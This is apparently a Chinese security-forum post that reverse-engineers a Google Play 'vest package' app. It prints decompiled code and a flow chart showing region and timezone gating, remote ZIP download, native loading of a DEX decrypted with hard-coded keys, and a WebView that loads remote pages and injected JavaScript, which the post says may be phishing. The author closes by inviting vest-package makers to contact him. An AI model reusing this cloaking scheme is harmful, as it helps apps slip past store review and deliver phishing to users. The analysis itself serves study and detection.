    j.a(("mcc:" + v + ""));
    // 将 object0 赋值给 ApiUtils.b
    ApiUtils.b = object0;
    // 检查 context0 是否为 Activity 实例
    if(context0 instanceof Activity) {
        // 调用 ApiUtils.a(context0) 并记录返回值
        boolean z = ApiUtils.a(context0);
        j.a(("isStart:" + z));
        // 如果返回值为 true，结束当前 Activity
        if(z) {
            ((Activity)context0).finish();
            return;
        }
 
        // 如果 s 不为空，则继续处理
        if(!TextUtils.isEmpty(s)) {
            // 如果 ApiUtils.a 为 null，创建一个新的 i 对象
            if(ApiUtils.a == null) {
                i i0 = new i();
                // 处理字符串 s
                if(!TextUtils.isEmpty(s)) {
                    String s1 = s.trim();
                    // 如果 s1 以 '{' 开头，直接使用
                    if(s1.startsWith("{")) {
                        s2 = s1;
                    }
                    // 否则尝试解密
                    else {
                        try {
                            s2 = g.a(s1, "klctBTqC");
                        }
                        catch(Exception exception0) {
                            exception0.printStackTrace();
                            s2 = s1;
                        }
                    }
 
                    // 解析 JSON 对象，设置 i 对象的各种属性
                    try {
                        i0 = new i();
                        JSONObject jSONObject0 = new JSONObject(s2);
                        i0.setDebug(jSONObject0.optBoolean("isDebug"));
                        j.a = i0.isDebug();
                        j.a(s2);
                        i0.setOpen(jSONObject0.optBoolean("isOpen"));
                        // 如果不是全屏模式，设置为非全屏
                        if(!jSONObject0.optBoolean("isFullScreen")) {
                            i0.setFullScreen(false);
                        }
 
                        i0.setOffSound(jSONObject0.optBoolean("isOffSound"));
                        i0.setRestart(jSONObject0.optBoolean("isRestart"));
                        i0.setRemoveAllViews(jSONObject0.optBoolean("isRemoveAllViews"));
                        i0.setDelayedLoading(jSONObject0.optBoolean("isDelayedLoading"));
                        i0.setUrlB(jSONObject0.optString("urlB"));
                        i0.setJs(jSONObject0.optString("js"));
                        i0.setJoin_url(jSONObject0.optString("join_url"));
                        i0.setAppsflyer_key(jSONObject0.optString("appsflyer_key"));
                        i0.setAdjust_token(jSONObject0.optString("adjust_token"));
                        i0.setClient(jSONObject0.optString("client"));
                        i0.setFacebook_appid(jSONObject0.optString("facebook_appid"));
                        i0.setFacebook_client_token(jSONObject0.optString("facebook_client_token"));
                        i0.setMcc(jSONObject0.optString("mcc"));
                        i0.setTimeZone(jSONObject0.optString("timeZone"));
                        i0.setHorizontal_screen_B(jSONObject0.optInt("horizontal_screen_B"));
                        JSONArray jSONArray0 = jSONObject0.optJSONArray("custom_event");
                        // 处理自定义事件数组
                        if(jSONArray0 != null) {
                            ArrayList arrayList0 = new ArrayList();
                            for(int v1 = 0; v1 < jSONArray0.length(); ++v1) {
                                JSONObject jSONObject1 = jSONArray0.optJSONObject(v1);
                                if(jSONObject1 != null) {
                                    a.a.a.a.i.a i$a0 = new a.a.a.a.i.a();
                                    i$a0.setAd_event_id(jSONObject1.optString("ad_event_id"));
                                    i$a0.setEvent_name(jSONObject1.optString("event_name"));
                                    arrayList0.add(i$a0);
                                }
                            }
 
                            i0.setCustom_event(arrayList0);
                        }
                    }
                    catch(JSONException jSONException0) {
                        jSONException0.printStackTrace();
                        throw new RuntimeException(jSONException0);
                    }
                }
 
                // 将 i0 赋值给 ApiUtils.a
                ApiUtils.a = i0;
                // 如果需要重启应用
                if(i0.isRestart()) {
                    SharedPreferences sharedPreferences0 = ((Activity)context0).getSharedPreferences("MyPrefsFile", 0);
                    // 检查是否是第一次启动
                    if(sharedPreferences0.getBoolean("isFirstTime", true)) {
                        SharedPreferences.Editor sharedPreferences$Editor0 = sharedPreferences0.edit();
                        sharedPreferences$Editor0.putBoolean("isFirstTime", false);
                        sharedPreferences$Editor0.commit();
                        j.a("restart");
                        // 重启应用
                        ((Activity)context0).startActivity(Intent.makeRestartActivityTask(((Activity)context0).getPackageManager().getLaunchIntentForPackage(((Activity)context0).getPackageName()).getComponent()));
                        Runtime.getRuntime().exit(0);
                    }
                }
            }
 
            // 获取 Google Ad ID
            Adjust.getGoogleAdId(((Activity)context0), new a.a.a.a.a());
            // 在 UI 线程上运行任务
            ((Activity)context0).runOnUiThread(new a.a.a.a.b(((Activity)context0)));
        }
    }
}

```

```
这段代码是一个 Android 应用的启动方法，主要功能包括：
1.  **MCC 检查**：获取并检查移动国家代码，如果为 454 (香港)，则设置特定标志。
2.  **Activity 管理**：检查传入的 `Context` 是否为 `Activity`，并根据 `ApiUtils.a(context0)` 的返回值决定是否结束当前 `Activity`。
3.  **配置解析**：如果提供了配置字符串 `s`，则解析该字符串（可能需要解密），并根据解析结果配置 `i` 对象的各种属性，如调试模式、是否开启、全屏模式、声音、重启、移除所有视图、延迟加载、URL、JS、加入 URL、Appsflyer 密钥、Adjust 令牌、客户端、Facebook 应用 ID、Facebook 客户端令牌、MCC、时区、横屏设置等。
4.  **自定义事件处理**：解析并设置自定义事件列表。
5.  **应用重启**：如果配置要求重启应用，并且是第一次启动，则重启应用。
6.  **广告 ID 获取**：获取 Google Ad ID。
7.  **UI 任务执行**：在 UI 线程上执行特定任务。
 
# Dex中的debug开关
 
```java
package a.a.a.a;
 
import android.util.Log;
 
public class j {
    public static boolean a;
    public static boolean b;
 
  
    public static int a(String s) {
        return !j.a && !j.b ? 0 : Log.e("LOG_TAG", s);
    }
}

```

切换横屏竖屏, 然后监听 activity 声明周期
==========================

```
public static void a(Activity activity, i iVar) {
      int horizontal_screen_B = iVar.getHorizontal_screen_B();
      if (horizontal_screen_B == 1) {
          activity.setRequestedOrientation(0);
      } else if (horizontal_screen_B != 2) {
          activity.setRequestedOrientation(4);
      } else {
          activity.setRequestedOrientation(1);
      }
      d = activity.getResources().getConfiguration().orientation;
      activity.findViewById(R.id.content).getViewTreeObserver().addOnGlobalLayoutListener(new a(activity, iVar));
  }

```

启动 webview
==========

```
public static final class b implements Application.ActivityLifecycleCallbacks {
        @Override  // android.app.Application$ActivityLifecycleCallbacks
        public void onActivityCreated(Activity activity0, Bundle bundle0) {
        }
 
        @Override  // android.app.Application$ActivityLifecycleCallbacks
        public void onActivityDestroyed(Activity activity0) {
            AdjustBridge.unregister();
        }
 
        @Override  // android.app.Application$ActivityLifecycleCallbacks
        public void onActivityPaused(Activity activity0) {
            Adjust.onPause();
        }
 
        @Override  // android.app.Application$ActivityLifecycleCallbacks
        public void onActivityResumed(Activity activity0) {
            public class a implements Runnable {
                public final Activity a;
 
                public a(Activity activity0) {
                    this.a = activity0;
                    super();
                }
 
                @Override
                public void run() {
                    j.a("onActivityResumed setFullScreen");
                    ApiUtils.b(this.a);
                    ApiUtils.a(this.a);
                }
            }
 
            j.a("onActivityResumed");
            MyWebView.a(MyWebView.a);    //启动webview
            Adjust.onResume();
            new Handler().postDelayed(new a(this, activity0), 500L);
        }
 
        @Override  // android.app.Application$ActivityLifecycleCallbacks
        public void onActivitySaveInstanceState(Activity activity0, Bundle bundle0) {
        }
 
        @Override  // android.app.Application$ActivityLifecycleCallbacks
        public void onActivityStarted(Activity activity0) {
        }
 
        @Override  // android.app.Application$ActivityLifecycleCallbacks
        public void onActivityStopped(Activity activity0) {
        }
    }

```

然后就是 webview 注册 jsapi 那一套了, 基本上没啥区别… 完~

大概流程

```
## 阶段 1：原生层 - 初始化与检查 (molika)
App启动加载so
-> 调用so molika() 原生函数
-> getMcc() 获取移动国家代码 (MCC)
-> (条件) 如果 MCC 是 454 (香港)，则设置 is_debug_enabled 标志
-> fetchMsg() 从服务器获取远程JSON配置
-> (条件) 如果配置为空，则 sendNotify(失败) 并退出
-> getTimeZoneInfo() 获取设备时区ID
-> check_timezone_zones() 检查时区ID是否在配置的白名单内
-> (条件) 如果时区不在白名单内，则 sendNotify(失败) 并退出
-> (成功) 创建后台线程，执行 thread_function()
## 阶段 2：原生层 - 资源下载与准备 (thread_function)
thread_function() 启动
-> 解析从 molika 传递的参数 (URL, JSON等)
-> getKey() 从本地获取上次成功的时间戳
-> 构造下载URL (在原始URL后附加 ?time=...)
-> (条件) 如果本地缓存文件存在且未超过2小时，则直接跳到解压步骤
-> (否则) downloadFile() 从服务器下载ZIP文件
-> (条件) 如果下载失败，则 sendNotify(失败) 并退出
-> setKey() 更新本地的成功时间戳
-> decompressZip() 解压下载的ZIP文件
## 阶段 3：原生层 - 动态库加载 (thread_function)
解压完成
-> 根据CPU架构 (arm64 或 armv7) 查找对应的 .so 文件
-> dlopen() 加载找到的 .so 文件到内存
-> dlsym() 在 .so 中查找名为 "biezheyang" 的函数
-> (条件) 如果加载或查找失败，则 sendNotify(失败) 并退出
-> (成功) 调用 biezheyang() 函数，进入下一阶段
## 阶段 4：原生层 - DEX解密与加载 (biezheyang / comeOn)
biezheyang() 启动
-> 在解压目录中查找 sdk_* 文件 (加密的核心DEX)
-> (条件) 如果未找到，则 sendNotify(失败) 并退出
-> decryptFile() 使用硬编码密钥 "d1r7oISRSnot8y8AkDr539PyE5sCUdfL" 解密文件
-> (条件) 如果解密失败，则 sendNotify(失败) 并退出
-> getDexClassLoader() 加载解密后的DEX文件
-> 通过反射查找类 com.ggaab123.da5252.abdkdisskk.ApiUtils
-> (成功) 通过反射调用该类的静态方法 start()
## 阶段 5：Java层 - 最终载荷执行 (ApiUtils.start)
start() 方法启动 (在动态加载的DEX中)
-> 解析传入的JSON配置字符串
-> (条件) 如果JSON是加密的，则使用密钥 "klctBTqC" 解密
-> (条件) 如果配置中 isRestart 为 true 且是首次启动，则强制重启App并退出
-> 初始化 Adjust / AppsFlyer 等第三方追踪SDK
-> 获取Google广告ID (GAID)
-> 在主线程 (UI Thread) 中执行：
-> 创建一个全屏 WebView
-> WebView 加载远程URL (来自JSON配置中的 urlB)
-> WebView 注入自定义JavaScript (来自JSON配置中的 js)
-> (最终行为) WebView显示广告、钓鱼页面或其他恶意内容
## 阶段 6：原生层 - 清理工作 (biezheyang / comeOn)
Java层 start() 方法调用后
-> remove() 删除解密后的DEX文件
-> deleteDirectory() 删除整个解压目录
-> 流程结束

```

通过这个谷歌马甲包案例大概可以了解他哪些事情来隐藏动态加载的逻辑, 从而达到 A 面到 B 面 (H5) 的加载

这个案例不同于算法逆向, 主要是梳理他的流程和逻辑

有做马甲包这块的可以联系我, 更进一步的交流 :)  
![](https://bbs.kanxue.com/upload/attach/202510/846973_CG3F34ZW5XA5BM7.webp)

[[培训] 传播安全知识、拓宽行业人脉——看雪讲师团队等你加入！](https://bbs.kanxue.com/thread-275828.htm)

最后于 5 小时前 被 tuosen 编辑 ，原因：

[#逆向分析](forum-161-1-118.htm)